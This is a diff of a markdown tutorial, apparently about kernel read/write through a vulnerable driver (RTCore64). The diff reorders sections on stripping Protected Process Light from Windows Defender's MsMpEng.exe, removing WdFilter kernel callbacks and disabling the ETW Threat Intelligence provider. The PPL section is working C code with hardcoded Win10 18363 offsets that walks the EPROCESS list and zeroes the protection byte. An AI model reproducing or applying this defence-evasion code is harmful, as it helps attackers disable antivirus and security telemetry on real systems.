@@ -222,66 +222,7 @@ sc.exe delete RTCore64
 
 ---
 
-## Example 1 — Stripping PPL
-
-Protected Process Light (PPL) is stored as a single byte at `EPROCESS + 0x6FA` (Win10 build 18363). Writing `0` to it removes the protection. No API can do this — the kernel enforces PPL before any access check runs.
-
-**Step 1: Find the System process EPROCESS**
-
-`PsInitialSystemProcess` is a global pointer in ntoskrnl pointing to the System process's `_EPROCESS` — the head of the active process list.
-
-```c
-#define RVA_PS_INITIAL_SYSTEM  0x5723A0ULL  /* Win10 18363 x64 */
-#define EPROC_LINKS_OFF        0x2F0
-#define EPROC_NAME_OFF         0x450
-#define EPROC_PROT_OFF         0x6FA
-
-DWORD64 sysEp = kread64(kbase + RVA_PS_INITIAL_SYSTEM);
-```
-
-**Step 2: Walk PsActiveProcessLinks**
-
-Every `_EPROCESS` contains a `LIST_ENTRY` at `+0x2F0` linking it into a circular list of all processes. Follow `Flink`, subtract the list offset to recover the `_EPROCESS` base, and check each process until you find the target:
-
-```c
-DWORD64 ep    = sysEp;
-int     guard = 0;
-
-do {
-    char    name[16] = {0};
-    BYTE    prot;
-
-    /* Read the 15-char ImageFileName in 4-byte chunks */
-    for (int i = 0; i < 16; i += 4) {
-        DWORD d = kread32(ep + EPROC_NAME_OFF + i);
-        memcpy(name + i, &d, 4);
-    }
-    name[15] = '\0';
-
-    /* EPROC_PROT_OFF (0x6FA) is not 4-byte aligned, so read the
-       containing DWORD and extract the byte we need */
-    DWORD64 aligned = (ep + EPROC_PROT_OFF) & ~(DWORD64)3;
-    int     shift   = (int)((ep + EPROC_PROT_OFF) & 3) * 8;
-    prot = (BYTE)(kread32(aligned) >> shift);
-
-    if (_stricmp(name, "MsMpEng.exe") == 0 && prot) {
-        kwrite8(ep + EPROC_PROT_OFF, 0);
-        printf("[+] Stripped PPL from %s (was 0x%02X)\n", name, prot);
-    }
-
-    DWORD64 flink = kread64(ep + EPROC_LINKS_OFF);
-    ep = flink - EPROC_LINKS_OFF;   /* step back from LIST_ENTRY to EPROCESS */
-
-} while (ep != sysEp && ++guard < 512);
-```
-
-After this runs, `OpenProcess(PROCESS_ALL_ACCESS, ...)` on MsMpEng succeeds. The PPL gate is gone.
-
-**Why `kwrite8` instead of `kwrite32`?** The Protection byte is at `+0x6FA`, which is not 4-byte aligned. The `kwrite8` function does a read-modify-write on the containing DWORD so that the adjacent bytes — which hold unrelated `_EPROCESS` fields — are left intact.
-
----
-
-## Example 2 — Removing Kernel Callbacks
+## Example 1 — Removing Kernel Callbacks
 
 Kernel notify callbacks let drivers like WdFilter observe every process creation, DLL load, and handle operation system-wide. Each of the three callback storage mechanisms requires a different removal approach.
 
@@ -376,7 +317,7 @@ After these three operations, WdFilter's callbacks are gone across all five type
 
 ---
 
-## Example 3 — Disabling ETW Threat Intelligence
+## Example 2 — Disabling ETW Threat Intelligence
 
 The ETW Threat Intelligence provider (`{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) is the kernel's security telemetry channel. When enabled, the kernel delivers events for suspicious kernel-mode operations to any process running a TI consumer session. Disabling it blinds all consumers at once.
 
@@ -431,6 +372,65 @@ printf("[+] ETW-TI disabled\n");
 ```
 
 After this, the kernel treats the TI provider as inactive and drops all events. Any process running a TI consumer session — such as Windows Defender's cloud protection component — receives nothing.
+
+---
+
+## Example 3 — Stripping PPL
+
+Protected Process Light (PPL) is stored as a single byte at `EPROCESS + 0x6FA` (Win10 build 18363). Writing `0` to it removes the protection. No API can do this — the kernel enforces PPL before any access check runs.
+
+**Step 1: Find the System process EPROCESS**
+
+`PsInitialSystemProcess` is a global pointer in ntoskrnl pointing to the System process's `_EPROCESS` — the head of the active process list.
+
+```c
+#define RVA_PS_INITIAL_SYSTEM  0x5723A0ULL  /* Win10 18363 x64 */
+#define EPROC_LINKS_OFF        0x2F0
+#define EPROC_NAME_OFF         0x450
+#define EPROC_PROT_OFF         0x6FA
+
+DWORD64 sysEp = kread64(kbase + RVA_PS_INITIAL_SYSTEM);
+```
+
+**Step 2: Walk PsActiveProcessLinks**
+
+Every `_EPROCESS` contains a `LIST_ENTRY` at `+0x2F0` linking it into a circular list of all processes. Follow `Flink`, subtract the list offset to recover the `_EPROCESS` base, and check each process until you find the target:
+
+```c
+DWORD64 ep    = sysEp;
+int     guard = 0;
+
+do {
+    char    name[16] = {0};
+    BYTE    prot;
+
+    /* Read the 15-char ImageFileName in 4-byte chunks */
+    for (int i = 0; i < 16; i += 4) {
+        DWORD d = kread32(ep + EPROC_NAME_OFF + i);
+        memcpy(name + i, &d, 4);
+    }
+    name[15] = '\0';
+
+    /* EPROC_PROT_OFF (0x6FA) is not 4-byte aligned, so read the
+       containing DWORD and extract the byte we need */
+    DWORD64 aligned = (ep + EPROC_PROT_OFF) & ~(DWORD64)3;
+    int     shift   = (int)((ep + EPROC_PROT_OFF) & 3) * 8;
+    prot = (BYTE)(kread32(aligned) >> shift);
+
+    if (_stricmp(name, "MsMpEng.exe") == 0 && prot) {
+        kwrite8(ep + EPROC_PROT_OFF, 0);
+        printf("[+] Stripped PPL from %s (was 0x%02X)\n", name, prot);
+    }
+
+    DWORD64 flink = kread64(ep + EPROC_LINKS_OFF);
+    ep = flink - EPROC_LINKS_OFF;   /* step back from LIST_ENTRY to EPROCESS */
+
+} while (ep != sysEp && ++guard < 512);
+```
+
+After this runs, `OpenProcess(PROCESS_ALL_ACCESS, ...)` on MsMpEng succeeds. The PPL gate is gone.
+
+**Why `kwrite8` instead of `kwrite32`?** The Protection byte is at `+0x6FA`, which is not 4-byte aligned. The `kwrite8` function does a read-modify-write on the containing DWORD so that the adjacent bytes — which hold unrelated `_EPROCESS` fields — are left intact.
 
 ---
 
